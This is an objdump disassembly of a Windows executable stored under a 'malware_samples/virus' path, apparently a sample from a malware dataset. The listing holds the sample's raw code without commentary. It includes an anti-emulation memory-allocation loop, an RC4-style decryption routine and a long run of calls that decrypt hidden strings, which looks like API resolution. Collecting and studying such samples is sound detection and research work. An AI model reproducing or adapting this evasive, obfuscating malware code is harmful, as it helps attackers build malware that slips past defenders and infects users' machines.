
malware_samples/virus/2871bfdf78b564d4f89bbeafd929c06f2a6ca00d74c6c7b632ffe4bf9232e6a9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	53                   	push   %ebx
  401001:	56                   	push   %esi
  401002:	57                   	push   %edi
  401003:	6a 04                	push   $0x4
  401005:	68 00 30 00 00       	push   $0x3000
  40100a:	be c0 41 c8 17       	mov    $0x17c841c0,%esi
  40100f:	56                   	push   %esi
  401010:	6a 00                	push   $0x0
  401012:	ff 15 6c 2f 45 00    	call   *0x452f6c
  401018:	8b f8                	mov    %eax,%edi
  40101a:	50                   	push   %eax
  40101b:	83 f8 11             	cmp    $0x11,%eax
  40101e:	74 05                	je     0x401025
  401020:	8b c0                	mov    %eax,%eax
  401022:	fc                   	cld
  401023:	85 c9                	test   %ecx,%ecx
  401025:	0b c0                	or     %eax,%eax
  401027:	f8                   	clc
  401028:	58                   	pop    %eax
  401029:	85 ff                	test   %edi,%edi
  40102b:	74 27                	je     0x401054
  40102d:	90                   	nop
  40102e:	8a c0                	mov    %al,%al
  401030:	68 c0 9e e6 05       	push   $0x5e69ec0
  401035:	6a 00                	push   $0x0
  401037:	57                   	push   %edi
  401038:	e8 83 cf 01 00       	call   0x41dfc0
  40103d:	83 c4 0c             	add    $0xc,%esp
  401040:	53                   	push   %ebx
  401041:	8a c9                	mov    %cl,%cl
  401043:	8a c9                	mov    %cl,%cl
  401045:	fc                   	cld
  401046:	5b                   	pop    %ebx
  401047:	68 00 80 00 00       	push   $0x8000
  40104c:	56                   	push   %esi
  40104d:	57                   	push   %edi
  40104e:	ff 15 94 2e 45 00    	call   *0x452e94
  401054:	5f                   	pop    %edi
  401055:	5e                   	pop    %esi
  401056:	5b                   	pop    %ebx
  401057:	c3                   	ret
  401058:	6a 00                	push   $0x0
  40105a:	6a 40                	push   $0x40
  40105c:	68 00 30 00 00       	push   $0x3000
  401061:	68 d0 07 00 00       	push   $0x7d0
  401066:	6a 00                	push   $0x0
  401068:	ff 15 3c 30 45 00    	call   *0x45303c
  40106e:	50                   	push   %eax
  40106f:	ff 15 f4 2f 45 00    	call   *0x452ff4
  401075:	85 c0                	test   %eax,%eax
  401077:	75 07                	jne    0x401080
  401079:	50                   	push   %eax
  40107a:	ff 15 24 2f 45 00    	call   *0x452f24
  401080:	e9 7b ff ff ff       	jmp    0x401000
  401085:	55                   	push   %ebp
  401086:	8d ac 24 64 f8 ff ff 	lea    -0x79c(%esp),%ebp
  40108d:	81 ec 1c 08 00 00    	sub    $0x81c,%esp
  401093:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  401098:	33 c5                	xor    %ebp,%eax
  40109a:	89 85 98 07 00 00    	mov    %eax,0x798(%ebp)
  4010a0:	8b 85 ac 07 00 00    	mov    0x7ac(%ebp),%eax
  4010a6:	53                   	push   %ebx
  4010a7:	8b 9d a8 07 00 00    	mov    0x7a8(%ebp),%ebx
  4010ad:	56                   	push   %esi
  4010ae:	8b b5 a4 07 00 00    	mov    0x7a4(%ebp),%esi
  4010b4:	57                   	push   %edi
  4010b5:	33 ff                	xor    %edi,%edi
  4010b7:	89 75 88             	mov    %esi,-0x78(%ebp)
  4010ba:	89 45 80             	mov    %eax,-0x80(%ebp)
  4010bd:	89 7d 94             	mov    %edi,-0x6c(%ebp)
  4010c0:	53                   	push   %ebx
  4010c1:	89 bc bd 98 03 00 00 	mov    %edi,0x398(%ebp,%edi,4)
  4010c8:	e8 c9 4b 01 00       	call   0x415c96
  4010cd:	59                   	pop    %ecx
  4010ce:	8b c8                	mov    %eax,%ecx
  4010d0:	33 d2                	xor    %edx,%edx
  4010d2:	8b c7                	mov    %edi,%eax
  4010d4:	f7 f1                	div    %ecx
  4010d6:	47                   	inc    %edi
  4010d7:	0f b6 04 1a          	movzbl (%edx,%ebx,1),%eax
  4010db:	89 44 bd 94          	mov    %eax,-0x6c(%ebp,%edi,4)
  4010df:	81 ff 00 01 00 00    	cmp    $0x100,%edi
  4010e5:	7c d9                	jl     0x4010c0
  4010e7:	33 d2                	xor    %edx,%edx
  4010e9:	8b 4c 15 98          	mov    -0x68(%ebp,%edx,1),%ecx
  4010ed:	8d 84 15 98 03 00 00 	lea    0x398(%ebp,%edx,1),%eax
  4010f4:	8b 38                	mov    (%eax),%edi
  4010f6:	03 cf                	add    %edi,%ecx
  4010f8:	03 4d 94             	add    -0x6c(%ebp),%ecx
  4010fb:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
  401101:	79 08                	jns    0x40110b
  401103:	49                   	dec    %ecx
  401104:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
  40110a:	41                   	inc    %ecx
  40110b:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  40110e:	8d 8c 8d 98 03 00 00 	lea    0x398(%ebp,%ecx,4),%ecx
  401115:	8b 19                	mov    (%ecx),%ebx
  401117:	83 c2 04             	add    $0x4,%edx
  40111a:	89 18                	mov    %ebx,(%eax)
  40111c:	89 39                	mov    %edi,(%ecx)
  40111e:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  401124:	7c c3                	jl     0x4010e9
  401126:	56                   	push   %esi
  401127:	e8 6a 4b 01 00       	call   0x415c96
  40112c:	40                   	inc    %eax
  40112d:	50                   	push   %eax
  40112e:	e8 1b c3 01 00       	call   0x41d44e
  401133:	8b d8                	mov    %eax,%ebx
  401135:	33 ff                	xor    %edi,%edi
  401137:	56                   	push   %esi
  401138:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  40113b:	89 7d 94             	mov    %edi,-0x6c(%ebp)
  40113e:	89 7d 90             	mov    %edi,-0x70(%ebp)
  401141:	e8 50 4b 01 00       	call   0x415c96
  401146:	83 c4 0c             	add    $0xc,%esp
  401149:	85 c0                	test   %eax,%eax
  40114b:	0f 8e 92 00 00 00    	jle    0x4011e3
  401151:	89 5d 8c             	mov    %ebx,-0x74(%ebp)
  401154:	29 75 8c             	sub    %esi,-0x74(%ebp)
  401157:	47                   	inc    %edi
  401158:	81 e7 ff 00 00 80    	and    $0x800000ff,%edi
  40115e:	79 08                	jns    0x401168
  401160:	4f                   	dec    %edi
  401161:	81 cf 00 ff ff ff    	or     $0xffffff00,%edi
  401167:	47                   	inc    %edi
  401168:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40116b:	8d 84 bd 98 03 00 00 	lea    0x398(%ebp,%edi,4),%eax
  401172:	8b 08                	mov    (%eax),%ecx
  401174:	03 d1                	add    %ecx,%edx
  401176:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  40117c:	79 08                	jns    0x401186
  40117e:	4a                   	dec    %edx
  40117f:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  401185:	42                   	inc    %edx
  401186:	89 55 94             	mov    %edx,-0x6c(%ebp)
  401189:	8d 94 95 98 03 00 00 	lea    0x398(%ebp,%edx,4),%edx
  401190:	8b 1a                	mov    (%edx),%ebx
  401192:	89 18                	mov    %ebx,(%eax)
  401194:	89 0a                	mov    %ecx,(%edx)
  401196:	8b 00                	mov    (%eax),%eax
  401198:	03 c1                	add    %ecx,%eax
  40119a:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40119f:	79 07                	jns    0x4011a8
  4011a1:	48                   	dec    %eax
  4011a2:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4011a7:	40                   	inc    %eax
  4011a8:	8a 0e                	mov    (%esi),%cl
  4011aa:	0f b6 d1             	movzbl %cl,%edx
  4011ad:	8d 84 85 98 03 00 00 	lea    0x398(%ebp,%eax,4),%eax
  4011b4:	39 10                	cmp    %edx,(%eax)
  4011b6:	75 08                	jne    0x4011c0
  4011b8:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4011bb:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  4011be:	eb 0a                	jmp    0x4011ca
  4011c0:	8a 00                	mov    (%eax),%al
  4011c2:	32 c1                	xor    %cl,%al
  4011c4:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  4011c7:	88 04 31             	mov    %al,(%ecx,%esi,1)
  4011ca:	ff 75 88             	push   -0x78(%ebp)
  4011cd:	ff 45 90             	incl   -0x70(%ebp)
  4011d0:	46                   	inc    %esi
  4011d1:	e8 c0 4a 01 00       	call   0x415c96
  4011d6:	59                   	pop    %ecx
  4011d7:	39 45 90             	cmp    %eax,-0x70(%ebp)
  4011da:	0f 8c 77 ff ff ff    	jl     0x401157
  4011e0:	8b 5d 84             	mov    -0x7c(%ebp),%ebx
  4011e3:	8b 45 90             	mov    -0x70(%ebp),%eax
  4011e6:	8b 8d 98 07 00 00    	mov    0x798(%ebp),%ecx
  4011ec:	c6 04 03 00          	movb   $0x0,(%ebx,%eax,1)
  4011f0:	8b 45 80             	mov    -0x80(%ebp),%eax
  4011f3:	5f                   	pop    %edi
  4011f4:	5e                   	pop    %esi
  4011f5:	89 18                	mov    %ebx,(%eax)
  4011f7:	33 cd                	xor    %ebp,%ecx
  4011f9:	5b                   	pop    %ebx
  4011fa:	e8 3b ce 01 00       	call   0x41e03a
  4011ff:	81 c5 9c 07 00 00    	add    $0x79c,%ebp
  401205:	c9                   	leave
  401206:	c3                   	ret
  401207:	55                   	push   %ebp
  401208:	8b ec                	mov    %esp,%ebp
  40120a:	b8 28 4e 00 00       	mov    $0x4e28,%eax
  40120f:	e8 3c ce 01 00       	call   0x41e050
  401214:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  401219:	33 c5                	xor    %ebp,%eax
  40121b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40121e:	53                   	push   %ebx
  40121f:	56                   	push   %esi
  401220:	57                   	push   %edi
  401221:	8b 7d 08             	mov    0x8(%ebp),%edi
  401224:	33 db                	xor    %ebx,%ebx
  401226:	68 1f 4e 00 00       	push   $0x4e1f
  40122b:	8d 85 dd b1 ff ff    	lea    -0x4e23(%ebp),%eax
  401231:	53                   	push   %ebx
  401232:	50                   	push   %eax
  401233:	88 9d dc b1 ff ff    	mov    %bl,-0x4e24(%ebp)
  401239:	e8 82 cd 01 00       	call   0x41dfc0
  40123e:	83 c4 0c             	add    $0xc,%esp
  401241:	53                   	push   %ebx
  401242:	53                   	push   %ebx
  401243:	8d 85 d8 b1 ff ff    	lea    -0x4e28(%ebp),%eax
  401249:	50                   	push   %eax
  40124a:	53                   	push   %ebx
  40124b:	6a 01                	push   $0x1
  40124d:	57                   	push   %edi
  40124e:	89 9d d8 b1 ff ff    	mov    %ebx,-0x4e28(%ebp)
  401254:	e8 3d 4a 01 00       	call   0x415c96
  401259:	8b 35 00 30 43 00    	mov    0x433000,%esi
  40125f:	59                   	pop    %ecx
  401260:	50                   	push   %eax
  401261:	57                   	push   %edi
  401262:	ff d6                	call   *%esi
  401264:	53                   	push   %ebx
  401265:	53                   	push   %ebx
  401266:	8d 85 d8 b1 ff ff    	lea    -0x4e28(%ebp),%eax
  40126c:	50                   	push   %eax
  40126d:	8d 85 dc b1 ff ff    	lea    -0x4e24(%ebp),%eax
  401273:	50                   	push   %eax
  401274:	6a 01                	push   $0x1
  401276:	57                   	push   %edi
  401277:	e8 1a 4a 01 00       	call   0x415c96
  40127c:	59                   	pop    %ecx
  40127d:	50                   	push   %eax
  40127e:	57                   	push   %edi
  40127f:	ff d6                	call   *%esi
  401281:	5f                   	pop    %edi
  401282:	5e                   	pop    %esi
  401283:	85 c0                	test   %eax,%eax
  401285:	5b                   	pop    %ebx
  401286:	8d 85 dc b1 ff ff    	lea    -0x4e24(%ebp),%eax
  40128c:	75 05                	jne    0x401293
  40128e:	b8 c0 31 43 00       	mov    $0x4331c0,%eax
  401293:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401296:	33 cd                	xor    %ebp,%ecx
  401298:	e8 9d cd 01 00       	call   0x41e03a
  40129d:	c9                   	leave
  40129e:	c3                   	ret
  40129f:	55                   	push   %ebp
  4012a0:	8d ac 24 70 ff ff ff 	lea    -0x90(%esp),%ebp
  4012a7:	81 ec 10 01 00 00    	sub    $0x110,%esp
  4012ad:	a1 a0 06 44 00       	mov    0x4406a0,%eax
  4012b2:	33 c5                	xor    %ebp,%eax
  4012b4:	89 85 8c 00 00 00    	mov    %eax,0x8c(%ebp)
  4012ba:	53                   	push   %ebx
  4012bb:	56                   	push   %esi
  4012bc:	8b b5 98 00 00 00    	mov    0x98(%ebp),%esi
  4012c2:	57                   	push   %edi
  4012c3:	bb 04 01 00 00       	mov    $0x104,%ebx
  4012c8:	53                   	push   %ebx
  4012c9:	8d 45 88             	lea    -0x78(%ebp),%eax
  4012cc:	6a 00                	push   $0x0
  4012ce:	50                   	push   %eax
  4012cf:	e8 ec cc 01 00       	call   0x41dfc0
  4012d4:	56                   	push   %esi
  4012d5:	e8 2d ff ff ff       	call   0x401207
  4012da:	83 c4 10             	add    $0x10,%esp
  4012dd:	8b d0                	mov    %eax,%edx
  4012df:	8a 08                	mov    (%eax),%cl
  4012e1:	40                   	inc    %eax
  4012e2:	84 c9                	test   %cl,%cl
  4012e4:	75 f9                	jne    0x4012df
  4012e6:	8d 7d 88             	lea    -0x78(%ebp),%edi
  4012e9:	2b c2                	sub    %edx,%eax
  4012eb:	4f                   	dec    %edi
  4012ec:	8a 4f 01             	mov    0x1(%edi),%cl
  4012ef:	47                   	inc    %edi
  4012f0:	84 c9                	test   %cl,%cl
  4012f2:	75 f8                	jne    0x4012ec
  4012f4:	8b c8                	mov    %eax,%ecx
  4012f6:	c1 e9 02             	shr    $0x2,%ecx
  4012f9:	8b f2                	mov    %edx,%esi
  4012fb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4012fd:	8b c8                	mov    %eax,%ecx
  4012ff:	53                   	push   %ebx
  401300:	83 e1 03             	and    $0x3,%ecx
  401303:	6a 00                	push   $0x0
  401305:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401307:	ff 15 08 30 43 00    	call   *0x433008
  40130d:	50                   	push   %eax
  40130e:	ff 15 20 30 43 00    	call   *0x433020
  401314:	83 65 80 00          	andl   $0x0,-0x80(%ebp)
  401318:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40131b:	51                   	push   %ecx
  40131c:	68 00 01 00 00       	push   $0x100
  401321:	6a 04                	push   $0x4
  401323:	50                   	push   %eax
  401324:	89 45 84             	mov    %eax,-0x7c(%ebp)
  401327:	ff 15 38 30 43 00    	call   *0x433038
  40132d:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401330:	50                   	push   %eax
  401331:	ff 35 44 1e 44 00    	push   0x441e44
  401337:	8d 45 88             	lea    -0x78(%ebp),%eax
  40133a:	50                   	push   %eax
  40133b:	e8 45 fd ff ff       	call   0x401085
  401340:	8b 8d 8c 00 00 00    	mov    0x8c(%ebp),%ecx
  401346:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401349:	83 c4 0c             	add    $0xc,%esp
  40134c:	5f                   	pop    %edi
  40134d:	5e                   	pop    %esi
  40134e:	33 cd                	xor    %ebp,%ecx
  401350:	5b                   	pop    %ebx
  401351:	e8 e4 cc 01 00       	call   0x41e03a
  401356:	81 c5 90 00 00 00    	add    $0x90,%ebp
  40135c:	c9                   	leave
  40135d:	c2 04 00             	ret    $0x4
  401360:	56                   	push   %esi
  401361:	68 3c 33 43 00       	push   $0x43333c
  401366:	8b f1                	mov    %ecx,%esi
  401368:	c7 05 44 1e 44 00 24 	movl   $0x433324,0x441e44
  40136f:	33 43 00 
  401372:	e8 28 ff ff ff       	call   0x40129f
  401377:	68 14 33 43 00       	push   $0x433314
  40137c:	8b ce                	mov    %esi,%ecx
  40137e:	a3 8c 21 44 00       	mov    %eax,0x44218c
  401383:	e8 17 ff ff ff       	call   0x40129f
  401388:	68 00 33 43 00       	push   $0x433300
  40138d:	8b ce                	mov    %esi,%ecx
  40138f:	a3 e8 22 44 00       	mov    %eax,0x4422e8
  401394:	e8 06 ff ff ff       	call   0x40129f
  401399:	68 f0 32 43 00       	push   $0x4332f0
  40139e:	8b ce                	mov    %esi,%ecx
  4013a0:	a3 e4 1c 44 00       	mov    %eax,0x441ce4
  4013a5:	e8 f5 fe ff ff       	call   0x40129f
  4013aa:	68 d8 32 43 00       	push   $0x4332d8
  4013af:	8b ce                	mov    %esi,%ecx
  4013b1:	a3 6c 22 44 00       	mov    %eax,0x44226c
  4013b6:	e8 e4 fe ff ff       	call   0x40129f
  4013bb:	68 cc 32 43 00       	push   $0x4332cc
  4013c0:	8b ce                	mov    %esi,%ecx
  4013c2:	a3 6c 1f 44 00       	mov    %eax,0x441f6c
  4013c7:	e8 d3 fe ff ff       	call   0x40129f
  4013cc:	68 b4 32 43 00       	push   $0x4332b4
  4013d1:	8b ce                	mov    %esi,%ecx
  4013d3:	a3 0c 1e 44 00       	mov    %eax,0x441e0c
  4013d8:	e8 c2 fe ff ff       	call   0x40129f
  4013dd:	68 a0 32 43 00       	push   $0x4332a0
  4013e2:	8b ce                	mov    %esi,%ecx
  4013e4:	a3 70 1b 44 00       	mov    %eax,0x441b70
  4013e9:	e8 b1 fe ff ff       	call   0x40129f
  4013ee:	68 84 32 43 00       	push   $0x433284
  4013f3:	8b ce                	mov    %esi,%ecx
  4013f5:	a3 08 23 44 00       	mov    %eax,0x442308
  4013fa:	e8 a0 fe ff ff       	call   0x40129f
  4013ff:	68 68 32 43 00       	push   $0x433268
  401404:	8b ce                	mov    %esi,%ecx
  401406:	a3 08 1d 44 00       	mov    %eax,0x441d08
  40140b:	e8 8f fe ff ff       	call   0x40129f
  401410:	68 54 32 43 00       	push   $0x433254
  401415:	8b ce                	mov    %esi,%ecx
  401417:	a3 4c 1e 44 00       	mov    %eax,0x441e4c
  40141c:	e8 7e fe ff ff       	call   0x40129f
  401421:	68 40 32 43 00       	push   $0x433240
  401426:	8b ce                	mov    %esi,%ecx
  401428:	a3 20 1f 44 00       	mov    %eax,0x441f20
  40142d:	e8 6d fe ff ff       	call   0x40129f
  401432:	68 30 32 43 00       	push   $0x433230
  401437:	8b ce                	mov    %esi,%ecx
  401439:	a3 28 22 44 00       	mov    %eax,0x442228
  40143e:	e8 5c fe ff ff       	call   0x40129f
  401443:	68 1c 32 43 00       	push   $0x43321c
  401448:	8b ce                	mov    %esi,%ecx
  40144a:	a3 b4 20 44 00       	mov    %eax,0x4420b4
  40144f:	e8 4b fe ff ff       	call   0x40129f
  401454:	68 00 32 43 00       	push   $0x433200
  401459:	8b ce                	mov    %esi,%ecx
  40145b:	a3 e4 1b 44 00       	mov    %eax,0x441be4
  401460:	e8 3a fe ff ff       	call   0x40129f
  401465:	68 ec 31 43 00       	push   $0x4331ec
  40146a:	8b ce                	mov    %esi,%ecx
  40146c:	a3 dc 22 44 00       	mov    %eax,0x4422dc
  401471:	e8 29 fe ff ff       	call   0x40129f
  401476:	68 d8 31 43 00       	push   $0x4331d8
  40147b:	8b ce                	mov    %esi,%ecx
  40147d:	a3 98 21 44 00       	mov    %eax,0x442198
  401482:	e8 18 fe ff ff       	call   0x40129f
  401487:	68 c4 31 43 00       	push   $0x4331c4
  40148c:	8b ce                	mov    %esi,%ecx
  40148e:	a3 b8 20 44 00       	mov    %eax,0x4420b8
  401493:	e8 07 fe ff ff       	call   0x40129f
  401498:	a3 04 1c 44 00       	mov    %eax,0x441c04
  40149d:	5e                   	pop    %esi
  40149e:	c3                   	ret
  40149f:	cc                   	int3
  4014a0:	cc                   	int3
  4014a1:	cc                   	int3
  4014a2:	cc                   	int3
  4014a3:	56                   	push   %esi
  4014a4:	57                   	push   %edi
  4014a5:	68 30 6a 43 00       	push   $0x436a30
  4014aa:	8b f1                	mov    %ecx,%esi
  4014ac:	e8 ee fd ff ff       	call   0x40129f
  4014b1:	68 20 6a 43 00       	push   $0x436a20
  4014b6:	8b ce                	mov    %esi,%ecx
  4014b8:	a3 e0 1b 44 00       	mov    %eax,0x441be0
  4014bd:	e8 dd fd ff ff       	call   0x40129f
  4014c2:	68 10 6a 43 00       	push   $0x436a10
  4014c7:	8b ce                	mov    %esi,%ecx
  4014c9:	a3 9c 22 44 00       	mov    %eax,0x44229c
  4014ce:	e8 cc fd ff ff       	call   0x40129f
  4014d3:	68 00 6a 43 00       	push   $0x436a00
  4014d8:	8b ce                	mov    %esi,%ecx
  4014da:	a3 c0 1d 44 00       	mov    %eax,0x441dc0
  4014df:	e8 bb fd ff ff       	call   0x40129f
  4014e4:	68 ec 69 43 00       	push   $0x4369ec
  4014e9:	8b ce                	mov    %esi,%ecx
  4014eb:	a3 70 1d 44 00       	mov    %eax,0x441d70
  4014f0:	e8 aa fd ff ff       	call   0x40129f
  4014f5:	68 dc 69 43 00       	push   $0x4369dc
  4014fa:	8b ce                	mov    %esi,%ecx
  4014fc:	a3 98 1f 44 00       	mov    %eax,0x441f98
  401501:	e8 99 fd ff ff       	call   0x40129f
  401506:	68 bc 69 43 00       	push   $0x4369bc
  40150b:	8b ce                	mov    %esi,%ecx
  40150d:	a3 a8 1e 44 00       	mov    %eax,0x441ea8
  401512:	e8 88 fd ff ff       	call   0x40129f
  401517:	68 a8 69 43 00       	push   $0x4369a8
  40151c:	8b ce                	mov    %esi,%ecx
  40151e:	a3 64 1f 44 00       	mov    %eax,0x441f64
  401523:	e8 77 fd ff ff       	call   0x40129f
  401528:	68 80 69 43 00       	push   $0x436980
  40152d:	8b ce                	mov    %esi,%ecx
  40152f:	a3 5c 1d 44 00       	mov    %eax,0x441d5c
  401534:	e8 66 fd ff ff       	call   0x40129f
  401539:	68 74 69 43 00       	push   $0x436974
  40153e:	8b ce                	mov    %esi,%ecx
  401540:	a3 48 1d 44 00       	mov    %eax,0x441d48
  401545:	e8 55 fd ff ff       	call   0x40129f
  40154a:	68 60 69 43 00       	push   $0x436960
  40154f:	8b ce                	mov    %esi,%ecx
  401551:	a3 c4 1c 44 00       	mov    %eax,0x441cc4
  401556:	e8 44 fd ff ff       	call   0x40129f
  40155b:	68 44 69 43 00       	push   $0x436944
  401560:	8b ce                	mov    %esi,%ecx
  401562:	a3 fc 20 44 00       	mov    %eax,0x4420fc
  401567:	e8 33 fd ff ff       	call   0x40129f
  40156c:	68 28 69 43 00       	push   $0x436928
  401571:	8b ce                	mov    %esi,%ecx
  401573:	a3 04 22 44 00       	mov    %eax,0x442204
  401578:	e8 22 fd ff ff       	call   0x40129f
  40157d:	68 00 69 43 00       	push   $0x436900
  401582:	8b ce                	mov    %esi,%ecx
  401584:	a3 80 1e 44 00       	mov    %eax,0x441e80
  401589:	e8 11 fd ff ff       	call   0x40129f
  40158e:	68 e8 68 43 00       	push   $0x4368e8
  401593:	8b ce                	mov    %esi,%ecx
  401595:	a3 e0 1c 44 00       	mov    %eax,0x441ce0
  40159a:	e8 00 fd ff ff       	call   0x40129f
  40159f:	68 d8 68 43 00       	push   $0x4368d8
  4015a4:	8b ce                	mov    %esi,%ecx
  4015a6:	a3 ac 1f 44 00       	mov    %eax,0x441fac
  4015ab:	e8 ef fc ff ff       	call   0x40129f
  4015b0:	68 c8 68 43 00       	push   $0x4368c8
  4015b5:	8b ce                	mov    %esi,%ecx
  4015b7:	a3 bc 21 44 00       	mov    %eax,0x4421bc
  4015bc:	e8 de fc ff ff       	call   0x40129f
  4015c1:	68 b4 68 43 00       	push   $0x4368b4
  4015c6:	8b ce                	mov    %esi,%ecx
  4015c8:	a3 dc 21 44 00       	mov    %eax,0x4421dc
  4015cd:	e8 cd fc ff ff       	call   0x40129f
  4015d2:	68 8c 68 43 00       	push   $0x43688c
  4015d7:	8b ce                	mov    %esi,%ecx
  4015d9:	a3 ec 21 44 00       	mov    %eax,0x4421ec
  4015de:	e8 bc fc ff ff       	call   0x40129f
  4015e3:	68 74 68 43 00       	push   $0x436874
  4015e8:	8b ce                	mov    %esi,%ecx
  4015ea:	a3 78 20 44 00       	mov    %eax,0x442078
  4015ef:	e8 ab fc ff ff       	call   0x40129f
  4015f4:	68 64 68 43 00       	push   $0x436864
  4015f9:	8b ce                	mov    %esi,%ecx
  4015fb:	a3 a0 21 44 00       	mov    %eax,0x4421a0
  401600:	e8 9a fc ff ff       	call   0x40129f
  401605:	68 4c 68 43 00       	push   $0x43684c
  40160a:	8b ce                	mov    %esi,%ecx
  40160c:	a3 90 22 44 00       	mov    %eax,0x442290
  401611:	e8 89 fc ff ff       	call   0x40129f
  401616:	68 30 68 43 00       	push   $0x436830
  40161b:	8b ce                	mov    %esi,%ecx
  40161d:	a3 ec 1d 44 00       	mov    %eax,0x441dec
  401622:	e8 78 fc ff ff       	call   0x40129f
  401627:	68 24 68 43 00       	push   $0x436824
  40162c:	8b ce                	mov    %esi,%ecx
  40162e:	a3 68 20 44 00       	mov    %eax,0x442068
  401633:	e8 67 fc ff ff       	call   0x40129f
  401638:	68 00 68 43 00       	push   $0x436800
  40163d:	8b ce                	mov    %esi,%ecx
  40163f:	a3 54 1f 44 00       	mov    %eax,0x441f54
  401644:	e8 56 fc ff ff       	call   0x40129f
  401649:	68 e0 67 43 00       	push   $0x4367e0
  40164e:	8b ce                	mov    %esi,%ecx
  401650:	a3 88 21 44 00       	mov    %eax,0x442188
  401655:	e8 45 fc ff ff       	call   0x40129f
  40165a:	68 d4 67 43 00       	push   $0x4367d4
  40165f:	8b ce                	mov    %esi,%ecx
  401661:	a3 8c 1c 44 00       	mov    %eax,0x441c8c
  401666:	e8 34 fc ff ff       	call   0x40129f
  40166b:	68 a0 67 43 00       	push   $0x4367a0
  401670:	8b ce                	mov    %esi,%ecx
  401672:	a3 18 1e 44 00       	mov    %eax,0x441e18
  401677:	e8 23 fc ff ff       	call   0x40129f
  40167c:	68 8c 67 43 00       	push   $0x43678c
  401681:	8b ce                	mov    %esi,%ecx
  401683:	a3 80 1c 44 00       	mov    %eax,0x441c80
  401688:	e8 12 fc ff ff       	call   0x40129f
  40168d:	68 7c 67 43 00       	push   $0x43677c
  401692:	8b ce                	mov    %esi,%ecx
  401694:	a3 d8 21 44 00       	mov    %eax,0x4421d8
  401699:	e8 01 fc ff ff       	call   0x40129f
  40169e:	68 70 67 43 00       	push   $0x436770
  4016a3:	8b ce                	mov    %esi,%ecx
  4016a5:	a3 30 1b 44 00       	mov    %eax,0x441b30
  4016aa:	e8 f0 fb ff ff       	call   0x40129f
  4016af:	68 68 67 43 00       	push   $0x436768
  4016b4:	8b ce                	mov    %esi,%ecx
  4016b6:	a3 24 1c 44 00       	mov    %eax,0x441c24
  4016bb:	e8 df fb ff ff       	call   0x40129f
  4016c0:	68 50 67 43 00       	push   $0x436750
  4016c5:	8b ce                	mov    %esi,%ecx
  4016c7:	a3 90 20 44 00       	mov    %eax,0x442090
  4016cc:	e8 ce fb ff ff       	call   0x40129f
  4016d1:	68 44 67 43 00       	push   $0x436744
  4016d6:	8b ce                	mov    %esi,%ecx
  4016d8:	a3 d4 1c 44 00       	mov    %eax,0x441cd4
  4016dd:	e8 bd fb ff ff       	call   0x40129f
  4016e2:	68 34 67 43 00       	push   $0x436734
  4016e7:	8b ce                	mov    %esi,%ecx
  4016e9:	a3 b0 1e 44 00       	mov    %eax,0x441eb0
  4016ee:	e8 ac fb ff ff       	call   0x40129f
  4016f3:	68 20 67 43 00       	push   $0x436720
  4016f8:	8b ce                	mov    %esi,%ecx
  4016fa:	a3 b4 1d 44 00       	mov    %eax,0x441db4
  4016ff:	e8 9b fb ff ff       	call   0x40129f
  401704:	68 08 67 43 00       	push   $0x436708
  401709:	8b ce                	mov    %esi,%ecx
  40170b:	a3 8c 22 44 00       	mov    %eax,0x44228c
  401710:	e8 8a fb ff ff       	call   0x40129f
  401715:	68 f8 66 43 00       	push   $0x4366f8
  40171a:	8b ce                	mov    %esi,%ecx
  40171c:	a3 d4 21 44 00       	mov    %eax,0x4421d4
  401721:	e8 79 fb ff ff       	call   0x40129f
  401726:	68 cc 66 43 00       	push   $0x4366cc
  40172b:	8b ce                	mov    %esi,%ecx
  40172d:	a3 00 1c 44 00       	mov    %eax,0x441c00
  401732:	e8 68 fb ff ff       	call   0x40129f
  401737:	68 bc 66 43 00       	push   $0x4366bc
  40173c:	8b ce                	mov    %esi,%ecx
  40173e:	a3 dc 1c 44 00       	mov    %eax,0x441cdc
  401743:	e8 57 fb ff ff       	call   0x40129f
  401748:	a3 0c 22 44 00       	mov    %eax,0x44220c
  40174d:	68 ac 66 43 00       	push   $0x4366ac
  401752:	8b ce                	mov    %esi,%ecx
  401754:	e8 46 fb ff ff       	call   0x40129f
  401759:	68 98 66 43 00       	push   $0x436698
  40175e:	8b ce                	mov    %esi,%ecx
  401760:	a3 10 1f 44 00       	mov    %eax,0x441f10
  401765:	e8 35 fb ff ff       	call   0x40129f
  40176a:	68 60 66 43 00       	push   $0x436660
  40176f:	8b ce                	mov    %esi,%ecx
  401771:	a3 18 1d 44 00       	mov    %eax,0x441d18
  401776:	e8 24 fb ff ff       	call   0x40129f
  40177b:	68 4c 66 43 00       	push   $0x43664c
  401780:	8b ce                	mov    %esi,%ecx
  401782:	a3 d4 1e 44 00       	mov    %eax,0x441ed4
  401787:	e8 13 fb ff ff       	call   0x40129f
  40178c:	68 30 66 43 00       	push   $0x436630
  401791:	8b ce                	mov    %esi,%ecx
  401793:	a3 c0 22 44 00       	mov    %eax,0x4422c0
  401798:	e8 02 fb ff ff       	call   0x40129f
  40179d:	68 24 66 43 00       	push   $0x436624
  4017a2:	8b ce                	mov    %esi,%ecx
  4017a4:	a3 ec 20 44 00       	mov    %eax,0x4420ec
  4017a9:	e8 f1 fa ff ff       	call   0x40129f
  4017ae:	68 10 66 43 00       	push   $0x436610
  4017b3:	8b ce                	mov    %esi,%ecx
  4017b5:	a3 30 1f 44 00       	mov    %eax,0x441f30
  4017ba:	e8 e0 fa ff ff       	call   0x40129f
  4017bf:	68 fc 65 43 00       	push   $0x4365fc
